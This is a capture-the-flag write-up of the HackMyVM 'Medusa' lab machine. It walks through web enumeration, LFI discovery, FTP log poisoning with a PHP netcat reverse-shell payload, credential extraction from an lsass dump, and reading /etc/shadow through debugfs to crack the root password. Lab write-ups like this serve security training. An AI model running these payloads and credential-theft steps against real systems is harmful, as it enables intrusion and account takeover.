@@ -1,1 +1,685 @@
+			ENUMERATION
+			
+
+---nmap---
+                                                                                  
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.59 -sC -sS -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 22:50 +03
+Nmap scan report for 10.0.2.59
+Host is up (0.00096s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 70:d4:ef:c9:27:6f:8d:95:7a:a5:51:19:51:fe:14:dc (RSA)
+|   256 3f:8d:24:3f:d2:5e:ca:e6:c9:af:37:23:47:bf:1d:28 (ECDSA)
+|_  256 0c:33:7e:4e:95:3d:b0:2d:6a:5e:ca:39:91:0d:13:08 (ED25519)
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+MAC Address: 08:00:27:C8:3A:5A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.5
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.96 ms 10.0.2.59
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.05 seconds
+             
+
+
+---open ftp, ssh and tcp ports---
+
+
+
+---when we check the website we discover a apache page and some keywords here get our attention---
+"check Kraken to open the door"
+
+
+
+---let's do some scanning---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.59 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php,css
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.59
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php,css
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 274]
+/index.html           (Status: 200) [Size: 10674]
+/.html                (Status: 403) [Size: 274]
+/manual               (Status: 301) [Size: 307] [--> http://10.0.2.59/manual/]
+/.html                (Status: 403) [Size: 274]
+/.php                 (Status: 403) [Size: 274]
+/server-status        (Status: 403) [Size: 274]
+/hades                (Status: 301) [Size: 306] [--> http://10.0.2.59/hades/]
+Progress: 1102800 / 1102805 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                            
+
+
+
+---find a hidden page called hades, let's scan it also---
+
+                    
+
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.59/hades -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php,css
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.59/hades
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php,css
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 274]
+/index.php            (Status: 200) [Size: 0]
+/.php                 (Status: 403) [Size: 274]
+/styles.css           (Status: 200) [Size: 198]
+/door.php             (Status: 200) [Size: 555]
+/.html                (Status: 403) [Size: 274]
+/.php                 (Status: 403) [Size: 274]
+Progress: 863797 / 1102805 (78.33%)[ERROR] Get "http://10.0.2.59/hades/imap4_server": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] Get "http://10.0.2.59/hades/firewall_server.html": dial tcp 10.0.2.59:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
+[ERROR] Get "http://10.0.2.59/hades/firewall_server.txt": dial tcp 10.0.2.59:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
+[ERROR] Get "http://10.0.2.59/hades/firewall_server.php": dial tcp 10.0.2.59:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
+===============================================================
+Finished
+===============================================================
+                  
+
+
+---here we see a page door.php, lets visit it http://10.0.2.59/hades/door.php---
+
+
+
+---it says enter the magic word, we know that we can use Kraken to open the door :)---
+
+
+
+---when we do so we discover a subdomain, medusa.hmv, add it to /etc/hosts---
+
+
+
+┌──(root㉿kali)-[/usr/share]
+└─# cat /etc/hosts
+127.0.0.1	localhost
+.
+.
+.
+
+10.0.2.59	medusa.hmv
+
+
+
+---lets scan this domain---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ffuf -u http://medusa.hmv -H 'Host:FUZZ.medusa.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 561 -fs 10674 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://medusa.hmv
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.medusa.hmv
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 10674
+ :: Filter           : Response words: 561
+________________________________________________
+
+dev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 20ms]
+:: Progress: [6369/114441] :: Job [1/1] :: 1785 req/sec :: Duration: [0:00:04] :: Errors: 0 ::^Z
+zsh: suspended  ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -
+                        
+
+
+
+---we got a new domain dev, add it to our dns system also so we can access it from the browser---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# cat /etc/hosts
+127.0.0.1	localhost
+.
+.
+.
+.
+
+10.0.2.59	dev.medusa.hmv  medusa.hmv
+
+
+
+
+---now lets scan this domain also---
+
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://dev.medusa.hmv -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt,php
+
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://dev.medusa.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,html,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 279]
+/index.html           (Status: 200) [Size: 1973]
+/.php                 (Status: 403) [Size: 279]
+/files                (Status: 301) [Size: 316] [--> http://dev.medusa.hmv/files/]
+/assets               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/assets/]
+/css                  (Status: 301) [Size: 314] [--> http://dev.medusa.hmv/css/]
+/manual               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/manual/]
+/robots.txt           (Status: 200) [Size: 489]
+/.html                (Status: 403) [Size: 279]
+/.php                 (Status: 403) [Size: 279]
+/server-status        (Status: 403) [Size: 279]
+Progress: 882240 / 882244 (100.00%)
+===============================================================
+Finished
+======================
+
+
+
+---discovered a new page, files. Scan this too until we get something useful---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/32- MEDUSA LINUX CTF]
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dev.medusa.hmv/files -x php,txt,html 
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://dev.medusa.hmv/files
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,html,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 279]
+/index.php            (Status: 200) [Size: 0]
+/.html                (Status: 403) [Size: 279]
+/system.php           (Status: 200) [Size: 0]
+/readme.txt           (Status: 200) [Size: 144]
+/.html                (Status: 403) [Size: 279]
+/.php                 (Status: 403) [Size: 279]
+
+
+---we get a page called system.php---
+
+
+
+---let's fuzz this page to see if we can discover any vulnerabilites, maybe and LFI. To check if there is an LFI
+vulnerability we try to read the file /etc/passwd---
+
+
+                                                                                              
+┌──(root㉿kali)-[/home/okina]
+└─# ffuf -r -c -ic -u 'http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 0
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 0
+________________________________________________
+
+view                    [Status: 200, Size: 1452, Words: 14, Lines: 28, Duration: 7ms]
+:: Progress: [54250/220547] :: Job [1/1] :: 4761 req/sec :: Duration: [0:00:14] :: Errors: 0 ::^Z
+zsh: suspended  ffuf -r -c -ic -w  -u  -fs 0
+                     
+
+---We discovered a page named view, /et/passwd worked. This shows us that there is a LFI vulnerability---
+
+
+
+---Now let's plan our attack. We know that ftp port is open, and there is an LFI vulnerability present. After doing
+some research I discover that we can utilize an attack via log poisoning---
+
+
+Log poisoning: It involves reading a log file through a "file inclusion" and modifying the text of the headers
+(User-agent for example) to write arbitrary code and achieve RCE on victim machine.
+
+
+
+
+---There is a method to utilize log poisoning with open ftp ports, to do so we start our listener first---
+
+                                                                                                                    
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lvnp 9999  
+listening on [any] 9999 ...
+
+
+
+---and now we will download a command named lftp---
+
+Lftp: It is a file transfer program
+
+
+                                                                                                                        
+┌──(root㉿kali)-[/usr/share]
+└─# lftp -u '<?php system("nc -e /bin/bash 10.0.2.54 9999"); ?>', 10.0.2.59
+lftp <?php system("nc -e /bin/bash 10.0.2.54 9999"); ?>@10.0.2.59:~> ls
+ls: Login failed: 530 Login incorrect.          
+lftp <?php system("nc -e /bin/bash 10.0.2.54 9999"); ?>@10.0.2.59:~> 
+
+
+
+---This puts a reverse connection in to the ftp server. Now let's activate it to gain access into the shell---
+
+
+                                                                                                                        
+┌──(root㉿kali)-[/home/okina]
+└─# curl http://dev.medusa.hmv/files/system.php\?view\=/var/log/vsftpd.log
+
+
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lvnp 9999  
+listening on [any] 9999 ...
+connect to [10.0.2.54] from (UNKNOWN) [10.0.2.59] 55298
+whoami
+www-data
+python3 -c 'import pty;pty.spawn("/bin/bash")';
+www-data@medusa:/var/www/dev/files$ 
+			
+			
+---we are in as www-data---
+
+
+---I tried linpeas, pspy64, SUID permissions, cron jobs but nothing came up---
+
+
+
+---I run this and found a zip file--- 
+
+www-data@medusa:/home$ find / -writable 2>/dev/null
+.
+.
+.
+/.../old_files.zip
+.
+.
+.
+
+
+---There were lots of files so I actually overlooked this file the first time---
+
+
+---I learned of a new method to look for files---
+
+
+www-data@medusa:/home$ find / -user www-data 2>/dev/null | grep -v "/proc"
+
+find / -user www-data 2>/dev/null | grep -v "/proc"
+/dev/pts/0
+/var/cache/apache2/mod_cache_disk
+/tmp/linpeas.sh
+/tmp/pspy64
+/run/lock/apache2
+/.../old_files.zip
+
+
+
+Note: Proc is used to obtain information about the system and to change certain kernel parameters at runtime.
+So we can check for the proc files that our user has access to  
+
+
+
+
+---so let's go to the file location and upload it to our machine so that we can crack it---
+
+
+www-data@medusa:/home$ cd /...
+cd /...
+
+www-data@medusa:/...$ ls
+ls
+old_files.zip
+
+www-data@medusa:/...$ python3 -m http.server 9000
+python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+10.0.2.54 - - [14/May/2024 08:10:19] "GET /old_files.zip HTTP/1.1" 200 -
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# wget 10.0.2.59:9000/old_files.zip   
+--2024-05-14 15:10:13--  http://10.0.2.59:9000/old_files.zip
+Connecting to 10.0.2.59:9000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 12387024 (12M) [application/zip]
+Saving to: ‘old_files.zip’
+
+old_files.zip                 100%[=================================================>]  11.81M  49.5MB/s    in 0.2s    
+
+2024-05-14 15:10:14 (49.5 MB/s) - ‘old_files.zip’ saved [12387024/12387024]
+
+                                                                                                                        
+┌──(root㉿kali)-[/home/okina]
+└─# ls
+dev_medusa.txt  medusa_linux_os_ctf_writeup.txt  old_files.zip
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# zip2john old_files.zip > file.txt                  
+                                                                                                                        
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/32- MEDUSA LINUX CTF]
+└─# john -w=/home/okina/wordlists/rockyou.txt file.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])
+Cost 1 (HMAC size) is 12386830 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+medusa666        (old_files.zip/lsass.DMP)     
+
+
+                                                                                                                        
+┌──(root㉿kali)-[/home/okina]
+└─# john file.txt --show  
+old_files.zip/lsass.DMP:medusa666:lsass.DMP:old_files.zip:old_files.zip
+
+
+
+---we see that this file is a lsass file and it's password is medusa666---
+
+
+Lsass: Local Security Authority Subsystem Service is a process that handles user auth, password changes,
+creates access tokens etc.
+
+
+
+
+---so let's extract the zip file using 7z, unzip didn't work---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# 7z x old_files.zip 
+
+7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
+ 64-bit locale=C.UTF-8 Threads:2 OPEN_MAX:1024
+
+Scanning the drive for archives:
+1 file, 12387024 bytes (12 MiB)
+
+Extracting archive: old_files.zip
+--
+Path = old_files.zip
+Type = zip
+Physical Size = 12387024
+
+    
+Enter password (will not be echoed):  //medusa666
+Everything is Ok
+
+Size:       34804383
+Compressed: 12387024
+                 
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/32- MEDUSA LINUX CTF]
+└─# ls                
+dev_medusa.txt  file.txt  lsass.DMP  medusa_linux_os_ctf_writeup.txt  old_files.zip
+
+
+
+---we see the lsass.DUMP file, dump it and lets get it's content, it probably has the password---
+
+
+                                                                                                                        
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/32- MEDUSA LINUX CTF]
+└─# pypykatz lsa minidump lsass.DMP
+INFO:pypykatz:Parsing file lsass.DMP
+FILE: ======== lsass.DMP =======
+== LogonSession ==
+authentication_id 2261421 (2281ad)
+session_id 18
+username avijneyam
+domainname Medusa-PC
+logon_server MEDUSA-PC
+logon_time 2023-01-17T14:05:20.008398+00:00
+sid S-1-5-21-1556941724-2101079873-2087351601-1016
+luid 2261421
+.
+.
+.
+.
+== LogonSession ==
+authentication_id 845877 (ce835)
+session_id 7
+username spectre
+domainname Medusa-PC
+logon_server MEDUSA-PC
+logon_time 2023-01-17T13:56:09.715430+00:00
+sid S-1-5-21-1556941724-2101079873-2087351601-1004
+luid 845877
+	== MSV ==
+		Username: spectre
+		Domain: Medusa-PC
+		LM: NA
+		NT: 6ec779920e220c163f33101085eff0b9
+		SHA1: 4d3341113c66127df14de8cc6ac7b4ebf52d74b5
+		DPAPI: NA
+	== WDIGEST [ce835]==
+		username spectre
+		domainname Medusa-PC
+		password 5p3ctr3_p0is0n_xX
+		password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
+	== Kerberos ==
+.
+.
+.
+.
+
+
+
+
+---here I find the password of the user spectre, 5p3ctr3_p0is0n_xX, let's login to ssh---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ssh spectre@10.0.2.59
+spectre@10.0.2.59's password: 
+Linux medusa 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Jan 21 14:57:30 2023 from 192.168.1.13
+spectre@medusa:~$ ls
+user.txt
+spectre@medusa:~$ cat user.txt 
+good job!
+
+---First User Flag---
+
+
+---we are in as the spectre and got our first flag, let's try to priv escalate--- 
+
+			
+
+
+
+			PRIVILEGE ESCALATION
+
+
+spectre@medusa:/tmp$ id
+uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+
+
+---if our user belongs to the group disk, this means that the user can read sensitive files, for example 
+/etc/shadow. But to do so we should identify the disk's mount path first---
+
+
+spectre@medusa:~$ df -h
+Filesystem      Size  Used Avail Use% Mounted on
+udev            471M     0  471M   0% /dev
+tmpfs            98M  512K   98M   1% /run
+/dev/sda1       6.9G  2.6G  4.0G  39% /
+tmpfs           489M     0  489M   0% /dev/shm
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs            98M     0   98M   0% /run/user/1000
+
+
+
+---df -h command displays info about total and available space in the system. Now that we learned where the disk is
+located, let's use debugfs command with the location---
+
+
+Debugfs: A special file system that is used for kernel debugging purposes. It gives developers and admins an interface
+to inspect and manipulate kernel data structures and system info
+
+
+spectre@medusa:~$ /usr/sbin/debugfs -w /dev/sda1
+
+debugfs 1.46.2 (28-Feb-2021)
+debugfs:  cat /etc/shadow
+
+root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::
+.
+.
+.
+.
+.
+spectre:$y$j9T$4TeFHbjRqRC9royagYTTJ/$KnU7QK1u0/5fpHHqE/ehPe6uqpwbs6vuvcQQH4EF9ZB:19374:0:99999:7:::
+systemd-coredump:!*:19372::::::
+ftp:*:19372:0:99999:7:::
+
+
+
+---here we get the hash of root user, download it to my machine and crack it---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# echo 'root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::' > root.txt
+   
+                                                                                                                     
+┌──(root㉿kali)-[/home/okina]
+└─# john -w=/home/okina/wordlists/rockyou.txt root.txt
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+
+                                                                                                                        
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/32- MEDUSA LINUX CTF]
+└─# john -w=/home/okina/wordlists/rockyou.txt root.txt --format=crypt
+Using default input encoding: UTF-8
+Loaded 1 password hash (crypt, generic crypt(3) [?/64])
+Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
+Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+andromeda        (root)     
+
+
+
+---we get the password for root, andromeda. Let's finish this---
+
+
+spectre@medusa:~$ su root
+Password: 
+
+root@medusa:/home/spectre# cd ~
+root@medusa:~# ls
+
+root@medusa:~# ls -la
+total 28
+drwx------  3 root root 4096 Jan 30  2023 .
+drwxr-xr-x 19 root root 4096 Jan 15  2023 ..
+lrwxrwxrwx  1 root root    9 Jan 15  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3526 Jan 17  2023 .bashrc
+drwxr-xr-x  3 root root 4096 Jan 15  2023 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r--r--  1 root root   53 Jan 18  2023 .rO0t.txt
+-rw-r--r--  1 root root   66 Jan 30  2023 .selected_editor
+
+root@medusa:~# cat .rO0t.txt 
+congrats hacker :)
+
+---Root User Flag---
 
